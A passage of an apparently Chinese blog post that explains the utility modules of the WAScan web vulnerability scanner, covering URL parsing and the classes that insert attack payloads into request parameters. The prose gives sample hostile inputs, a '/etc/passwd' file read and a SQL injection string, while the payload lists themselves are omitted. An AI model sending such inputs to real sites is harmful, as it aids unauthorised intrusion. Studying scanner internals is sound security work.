<span class="keyword">return</span> url+<span class="string">"?"</span>+ params</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CParams</span><span class="params">(url)</span>:</span></div><div class="line">	<span class="keyword">if</span> <span class="string">'&amp;'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</div><div class="line">		url = sub(findall(<span class="string">r'\?(\S*)\='</span>,url)[<span class="number">0</span>],<span class="string">'%s%s%s'</span>%(GREEN%(<span class="number">1</span>),findall(<span class="string">r'\?(\S*)\='</span>,url)[<span class="number">0</span>],RESET),url)</div><div class="line">		<span class="keyword">return</span> url</div><div class="line">	<span class="keyword">elif</span> <span class="string">'&amp;'</span> <span class="keyword">in</span> url:</div><div class="line">		url = sub(findall(<span class="string">r'\&amp;(\S*)\='</span>,url)[<span class="number">0</span>],<span class="string">'%s%s%s'</span>%(GREEN%(<span class="number">1</span>),findall(<span class="string">r'\&amp;(\S*)\='</span>,url)[<span class="number">0</span>],RESET),url)</div><div class="line">		<span class="keyword">return</span> url </div><div class="line">	<span class="keyword">else</span>: <span class="keyword">return</span> url</div><div class="line"></div><div class="line"><span class="comment"># url检查，协议</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CUrl</span><span class="params">(url)</span>:</span></div><div class="line">	split = urlsplit(url)</div><div class="line">	<span class="comment"># check URL scheme</span></div><div class="line">	<span class="keyword">if</span> split.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'http'</span>,<span class="string">'https'</span>,<span class="string">''</span>]:</div><div class="line">		<span class="comment"># e.g: exit if URL scheme = ftp,ssh,..etc</span></div><div class="line">		exit(less(<span class="string">'Check your URL, scheme "%s" not supported!!'</span>%(split.scheme)))</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="comment"># if URL --&gt; www.site.com</span></div><div class="line">		<span class="keyword">if</span> split.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'http'</span>,<span class="string">'https'</span>]:</div><div class="line">			<span class="comment"># return http://www.site.com</span></div><div class="line">			<span class="keyword">return</span> <span class="string">"http://%s"</span>%(url)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">return</span> url</div><div class="line"><span class="comment"># url重组</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CNQuery</span><span class="params">(url)</span>:</span></div><div class="line">	<span class="keyword">if</span> <span class="string">'?'</span> <span class="keyword">in</span> url:</div><div class="line">		parse = urlsplit(url)</div><div class="line">		<span class="keyword">if</span> parse.scheme:<span class="keyword">return</span> parse.scheme + <span class="string">'://'</span> + parse.netloc + <span class="string">'/'</span> </div><div class="line">		<span class="keyword">else</span>: <span class="keyword">return</span> <span class="string">'http://'</span> + parse.path+<span class="string">'/'</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		parse = urlsplit(url)</div><div class="line">		<span class="keyword">if</span> parse.scheme:<span class="keyword">return</span> parse.scheme + <span class="string">'://'</span> + parse.netloc + <span class="string">'/'</span></div><div class="line">		<span class="keyword">else</span>:<span class="keyword">return</span> <span class="string">'http://'</span> + parse.path + <span class="string">'/'</span></div><div class="line"></div><div class="line"><span class="comment"># 检查url的尾部 是否 / 结尾，去除</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CEndUrl</span><span class="params">(url)</span>:</span></div><div class="line">	<span class="keyword">if</span> url.endswith(<span class="string">'/'</span>):</div><div class="line">		<span class="keyword">return</span> url[:<span class="number">-1</span>]</div><div class="line">	<span class="keyword">return</span> url</div><div class="line"></div><div class="line"><span class="comment"># 接受 scan参数即 扫描类型</span></div><div class="line"><span class="comment"># 然后进行检查是否在 0 - 5 的范围内</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CScan</span><span class="params">(scan)</span>:</span></div><div class="line">	<span class="comment"># check scan options</span></div><div class="line">	<span class="keyword">if</span> scan <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>]:</div><div class="line">		info(<span class="string">'Option --scan haven\'t argument, assuming default value 5'</span>)</div><div class="line">		scan = int(<span class="string">'5'</span>) </div><div class="line">	<span class="keyword">if</span> isinstance(scan,str):</div><div class="line">		<span class="keyword">return</span> int(scan)</div><div class="line">	<span class="keyword">return</span> int(scan)</div><div class="line"></div><div class="line"><span class="comment"># 对 URL进行各项切分</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SplitURL</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></div><div class="line">		<span class="comment"># http,https</span></div><div class="line">		<span class="comment"># 协议</span></div><div class="line">		self.scheme = urlsplit(url).scheme </div><div class="line">		<span class="comment"># 域名</span></div><div class="line">		<span class="comment"># www.site.com</span></div><div class="line">		self.netloc = CUrl(urlsplit(url).netloc)</div><div class="line">		<span class="comment"># 路径</span></div><div class="line">		<span class="comment"># /test/index.php</span></div><div class="line">		self.path = urlsplit(url).path</div><div class="line">		<span class="comment"># 查询参数</span></div><div class="line">		<span class="comment"># id=1&amp;f=1</span></div><div class="line">		self.query = urlsplit(url).query</div><div class="line">		<span class="comment"># fragment</span></div><div class="line">		<span class="comment"># #test</span></div><div class="line">		self.fragment = urlsplit(url).fragment</div><div class="line"></div><div class="line"><span class="comment"># 解析 host头部</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHeaders</span><span class="params">(headers)</span>:</span></div><div class="line">	<span class="comment"># e.g: "Host:google.com" return &#123;'Host':'google.com'&#125;</span></div><div class="line">	_ = &#123;&#125;</div><div class="line">	<span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span> headers:</div><div class="line">		<span class="keyword">if</span> <span class="string">','</span> <span class="keyword">in</span> headers:</div><div class="line">			headerList = headers.split(<span class="string">','</span>)</div><div class="line">			<span class="keyword">for</span> header <span class="keyword">in</span> headerList:</div><div class="line">				_[header.split(<span class="string">':'</span>)[<span class="number">0</span>]] = header.split(<span class="string">':'</span>)[<span class="number">1</span>]</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			_[headers.split(<span class="string">':'</span>)[<span class="number">0</span>]] = headers.split(<span class="string">':'</span>)[<span class="number">1</span>]</div><div class="line">	<span class="keyword">return</span> _</div><div class="line"></div><div class="line"><span class="comment"># 用于 认证</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CAuth</span><span class="params">(auth)</span>:</span></div><div class="line">	<span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">not</span> <span class="keyword">in</span> auth:</div><div class="line">		<span class="keyword">return</span> <span class="string">"%s:"</span>%(auth)</div><div class="line">	<span class="keyword">return</span> auth</div></pre></td></tr></table></figure></p>
<h2 id="颜色常量定义：-lib-utils-colors-py"><a href="#颜色常量定义：-lib-utils-colors-py" class="headerlink" title="颜色常量定义： lib/utils/colors.py"></a>颜色常量定义： lib/utils/colors.py</h2><p>定义一些颜色常量，略过。</p>
<h2 id="列举py文件：-lib-utils-dirs-py"><a href="#列举py文件：-lib-utils-dirs-py" class="headerlink" title="列举py文件： lib/utils/dirs.py"></a>列举py文件： lib/utils/dirs.py</h2><p>定义了<code>dirs</code>函数，用于列举出指定目录下，指定后缀名为<code>py</code>，且不是<code>__init__.py</code>的 py文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dirs</span><span class="params">(path)</span>:</span></div><div class="line">	files = []</div><div class="line">	_ = os.listdir(path)</div><div class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> _:</div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> file.endswith(<span class="string">'.py'</span>) <span class="keyword">or</span> file == <span class="string">'__init__.py'</span>:<span class="keyword">pass</span></div><div class="line">		<span class="keyword">else</span>:files.append(file)</div><div class="line">	<span class="keyword">return</span> files</div></pre></td></tr></table></figure></p>
<p>测试用例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">39</span>]: <span class="keyword">from</span> lib.utils.dirs <span class="keyword">import</span> dirs</div><div class="line"></div><div class="line">In [<span class="number">40</span>]: dirs(<span class="string">"./"</span>)</div><div class="line">Out[<span class="number">40</span>]: [<span class="string">'wascan.py'</span>]</div><div class="line"></div><div class="line">In [<span class="number">41</span>]: dirs(<span class="string">"./lib/utils/"</span>)</div><div class="line">Out[<span class="number">41</span>]: </div><div class="line">[<span class="string">'params.py'</span>,</div><div class="line"> <span class="string">'usage.py'</span>,</div><div class="line"> <span class="string">'colors.py'</span>,</div><div class="line"> <span class="string">'readfile.py'</span>,</div><div class="line"> <span class="string">'exception.py'</span>,</div><div class="line"> <span class="string">'check.py'</span>,</div><div class="line"> <span class="string">'printer.py'</span>,</div><div class="line"> <span class="string">'unicode.py'</span>,</div><div class="line"> <span class="string">'settings.py'</span>,</div><div class="line"> <span class="string">'rand.py'</span>,</div><div class="line"> <span class="string">'dirs.py'</span>,</div><div class="line"> <span class="string">'payload.py'</span>]</div></pre></td></tr></table></figure></p>
<h2 id="异常定义：lib-utils-exception-py"><a href="#异常定义：lib-utils-exception-py" class="headerlink" title="异常定义：lib/utils/exception.py"></a>异常定义：lib/utils/exception.py</h2><p>定义了几种可能出现的错误：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanUnboundLocalError</span><span class="params">(UnboundLocalError)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanDataException</span><span class="params">(Exception)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanNoneException</span><span class="params">(Exception)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanInputException</span><span class="params">(Exception)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanGenericException</span><span class="params">(Exception)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanConnectionException</span><span class="params">(HTTPError)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">WascanKeyboardInterrupt</span><span class="params">(KeyboardInterrupt)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<h2 id="参数payload处理：lib-utils-params-py"><a href="#参数payload处理：lib-utils-params-py" class="headerlink" title="参数payload处理：lib/utils/params.py"></a>参数payload处理：lib/utils/params.py</h2><p>定义了两个类，用于处理<code>请求参数</code>和<code>payload</code>的关系,替换和拼接。替换的场景，比如任意文件读取，<code>?readfile=xx</code> 可能替换成<code>?readfile=/etc/passwd</code> 。拼接的场景，比如SQL注入，<code>?id=1</code> ,可能拼接为 <code>?id=1&#39;</code> 或者 <code>?id=1&quot; or 1=1</code></p>
<p>第一个类<code>preplace</code>替换，用于把<code>请求参数</code>的值替换为对应的<code>payload</code>。存疑一:get请求中用<code>sub(porignal,ppayload,self.url)</code>来处理，而post请求中用<code>self.data.replace(porignal,ppayload</code>请求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">preplace</span>:</span></div><div class="line">	<span class="string">""" replace params with payload"""</span></div><div class="line">	<span class="comment"># 初始化</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,payload,data)</span>:</span></div><div class="line">		<span class="comment"># url</span></div><div class="line">		self.url = url </div><div class="line">		<span class="comment"># data 指 POST请求的 POST部分</span></div><div class="line">		<span class="comment"># 对于 GET 请求，data 为 None</span></div><div class="line">		self.data = data</div><div class="line">		<span class="comment"># _params </span></div><div class="line">		self._params = []</div><div class="line">		<span class="comment"># 对应的 payload</span></div><div class="line">		self.payload = payload</div><div class="line"></div><div class="line">	<span class="comment"># 处理GET请求</span></div><div class="line">	<span class="comment"># http://test.com?a=1&amp;b=2</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""get"""</span></div><div class="line">		params = self.url.split(<span class="string">"?"</span>)[<span class="number">1</span>].split(<span class="string">"&amp;"</span>)</div><div class="line">		<span class="comment"># params = ['a=1', 'b=2']</span></div><div class="line">		<span class="comment"># 对 params 中的每一个参数</span></div><div class="line">		<span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">			<span class="comment"># 按照 = 切割，替换成payload  即  a=payload</span></div><div class="line">			ppayload = param.replace(param.split(<span class="string">"="</span>)[<span class="number">1</span>],self.payload)</div><div class="line">			<span class="comment"># 获取原本的参数对</span></div><div class="line">			porignal = param.replace(ppayload.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">"="</span>)[<span class="number">1</span>])</div><div class="line"></div><div class="line">			<span class="comment"># http://test.com?a=payload&amp;b=2</span></div><div class="line">			self._params.append(sub(porignal,ppayload,self.url))</div><div class="line"></div><div class="line">	<span class="comment"># 处理POST请求</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""post"""</span></div><div class="line">		params = self.data.split(<span class="string">"&amp;"</span>)</div><div class="line">		<span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">			ppayload = param.replace(param.split(<span class="string">"="</span>)[<span class="number">1</span>],self.payload)</div><div class="line">			porignal = param.replace(ppayload.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">"="</span>)[<span class="number">1</span>])</div><div class="line">			self._params.append(self.data.replace(porignal,ppayload))</div><div class="line">	</div><div class="line">	<span class="comment"># 开始处理</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="comment"># 如果 url中 带有 ? , 并且 data部分 为 None</span></div><div class="line">		<span class="keyword">if</span> <span class="string">"?"</span> <span class="keyword">in</span> self.url <span class="keyword">and</span> self.data == <span class="keyword">None</span>:</div><div class="line">			<span class="comment"># GET请求 处理</span></div><div class="line">			self.get()</div><div class="line">		<span class="comment"># 如果 url中 没有 ? , 并且 data部分 不为 None</span></div><div class="line">		<span class="keyword">elif</span> <span class="string">"?"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.url <span class="keyword">and</span> self.data != <span class="keyword">None</span>:</div><div class="line">			<span class="comment"># POST请求 处理</span></div><div class="line">			self.post()</div><div class="line">		<span class="comment"># 其他情况 无法明确判断</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># 都进行一遍处理</span></div><div class="line">			self.get()</div><div class="line">			self.post()</div><div class="line">		<span class="keyword">return</span> self._params</div></pre></td></tr></table></figure>
<p>第二个类<code>padd</code>，用于往请求参数中添加payload。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">padd</span>:</span></div><div class="line">	<span class="string">""" add the payload to params """</span></div><div class="line">	<span class="comment"># 基本的初始化</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,payload,data)</span>:</span></div><div class="line">		self.url = url </div><div class="line">		self.data = data</div><div class="line">		self._params = []</div><div class="line">		self.payload = payload</div><div class="line"></div><div class="line">	<span class="comment"># 处理GET请求</span></div><div class="line">	<span class="comment"># http://test.com?a=1&amp;b=2</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""get"""</span></div><div class="line">		params = self.url.split(<span class="string">"?"</span>)[<span class="number">1</span>].split(<span class="string">"&amp;"</span>)</div><div class="line">		<span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">			<span class="comment"># a=1payload</span></div><div class="line">			ppayload = param.replace(param.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">'='</span>)[<span class="number">1</span>]+self.payload)</div><div class="line">			porignal = param.replace(ppayload.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">"="</span>)[<span class="number">1</span>])</div><div class="line">			self._params.append(sub(porignal,ppayload,self.url))</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""post"""</span></div><div class="line">		params = self.data.split(<span class="string">"&amp;"</span>)</div><div class="line">		<span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">			ppayload = param.replace(param.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">'='</span>)[<span class="number">1</span>]+self.payload)</div><div class="line">			porignal = param.replace(ppayload.split(<span class="string">"="</span>)[<span class="number">1</span>],param.split(<span class="string">"="</span>)[<span class="number">1</span>])</div><div class="line">			self._params.append(self.data.replace(porignal,ppayload))</div><div class="line">	<span class="comment"># 进行处理</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">if</span> <span class="string">"?"</span> <span class="keyword">in</span> self.url <span class="keyword">and</span> self.data == <span class="keyword">None</span>:</div><div class="line">			self.get()</div><div class="line">		<span class="keyword">elif</span> <span class="string">"?"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.url <span class="keyword">and</span> self.data != <span class="keyword">None</span>:</div><div class="line">			self.post()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			self.get()</div><div class="line">			self.post()</div><div class="line">		<span class="keyword">return</span> self._params</div></pre></td></tr></table></figure></p>
<h2 id="基本攻击payload-lib-utils-payload-py"><a href="#基本攻击payload-lib-utils-payload-py" class="headerlink" title="基本攻击payload: lib/utils/payload.py"></a>基本攻击payload: lib/utils/payload.py</h2><p>整合了基本攻击的各种payload。对于每种攻击，返回list。结合前面<code>整体功能 -&gt; 攻击</code>章节：<br>|类型|对应函数payload|<br>|:—:|:—:|<br>|Bash 命令注入|bash()|<br>|SQL盲注|bsql()|<br>|溢出|None|<br>|CRLF|crlfp()|<br>|头部SQL注入|None|<br>|头部XSS|None|<br>|HTML注入|html()|<br>|LDAP注入|ldap()|<br>|本地文件包含| plfi()|<br>|执行操作系统命令|os()|<br>|php 代码注入|php()|<br>|SQL注入|sql()|<br>|服务器端注入|ssip() , pssi()|<br>|Xpath注入|xpath()|<br>|XSS|pxss()|<br>|XML注入|xxep()|</p>
<p><code>头部SQL注入</code>、<code>溢出</code>、<code>头部XSS</code>在该文件中对应的payload似乎没有出现。payload的具体内容就这里不展开，具体等后文与调用代码结合解释。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Server Side Injection </span></div><div class="line"><span class="comment"># 有待研究</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssip</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Server Side Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># CRLF  </span></div><div class="line"><span class="comment"># CRLF字符对应 %0d %0a</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">crlfp</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">"""Carriage Return Line Feed"""</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># XXE</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxep</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" XML External Entity"""</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># SSI</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pssi</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Server Side Include"""</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># XSS</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pxss</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Cross-Site Scripting"""</span></div><div class="line">	省略</div><div class="line"><span class="comment"># php代码注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">php</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" PHP Code Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># xpath注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xpath</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Xpath """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># bash注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bash</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">"""Basic Bash Command Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># sql注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">"""Generic SQL"""</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># os命令注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">os</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" OS Command Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># 本地文件包含</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">plfi</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Local file Inclusion """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># 盲注</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsql</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" Blind SQL Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># html注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" HTML Code Injection """</span></div><div class="line">	省略</div><div class="line"></div><div class="line"><span class="comment"># ldap注入</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ldap</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" LDAP Injection """</span></div><div class="line">	省略</div></pre></td></tr></table></figure>
<h2 id="格式化打印：-lib-utils-printer-py"><a href="#格式化打印：-lib-utils-printer-py" class="headerlink" title="格式化打印： lib/utils/printer.py"></a>格式化打印： lib/utils/printer.py</h2><p>定义了各种打印输出方法，基本的格式化字符串、颜色、编码等等。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">plus</span><span class="params">(string,flag=<span class="string">"[+]"</span>)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"&#123;&#125;&#123;&#125;&#123;&#125; &#123;&#125;&#123;&#125;&#123;&#125;"</span>.format(</div><div class="line">		GREEN%(<span class="number">0</span>),flag,RESET,</div><div class="line">		WHITE%(<span class="number">0</span>),ucode(string),RESET</div><div class="line">		)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">less</span><span class="params">(string,flag=<span class="string">"[-]"</span>)</span>:</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">warn</span><span class="params">(string,flag=<span class="string">"[!]"</span>)</span>:</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(string,flag=<span class="string">"[*]"</span>)</span>:</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(string,flag=<span class="string">"[i]"</span>)</span>:</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more</span><span class="params">(string,flag=<span class="string">"|"</span>)</span>:</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">null</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">""</span></div></pre></td></tr></table></figure></p>
<h2 id="随机串生成：-lib-utils-rand-py"><a href="#随机串生成：-lib-utils-rand-py" class="headerlink" title="随机串生成： lib/utils/rand.py"></a>随机串生成： lib/utils/rand.py</h2><p>定义两个函数。第一个是<code>r_time</code>基于当前时间<code>strftime(&#39;%y%m%d&#39;)</code> 用来生成随机数字。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_time</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">""" random numbers """</span></div><div class="line">	<span class="keyword">return</span> randint(<span class="number">0</span>,int(strftime(<span class="string">'%y%m%d'</span>)))</div></pre></td></tr></table></figure></p>
<p>第二个是<code>r_string</code>，用于生成指定长度为<code>n</code>的包含大写或者小写字母的随机字符串。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_string</span><span class="params">(n)</span>:</span></div><div class="line">	<span class="string">""" random strings """</span></div><div class="line">	<span class="keyword">return</span> <span class="string">""</span>.join([choice(uppercase+lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">0</span>,int(n))])</div></pre></td></tr></table></figure></p>
